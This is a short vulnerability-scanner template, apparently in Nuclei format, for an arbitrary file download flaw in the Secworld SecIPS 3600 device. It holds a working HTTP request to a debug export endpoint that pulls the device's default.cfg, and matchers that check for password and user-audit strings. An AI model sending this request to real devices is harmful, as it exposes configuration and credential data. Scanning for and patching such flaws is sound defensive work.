id: secworld-secips-3600-debuginfo-readfile

info:
  name: 网神 SecIPS 3600 debug_info_export 任意文件下载
  author: zan8in
  severity: high
  description: 网神 SecIPS 3600 debug_info_export接口存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器敏感文件
  
http:
  - raw:
      - |+
        GET /webui/debug/debug_info_export?filename=default.cfg HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'password cipher'
      - type: word
        part: body
        words:
          - 'user audit type'
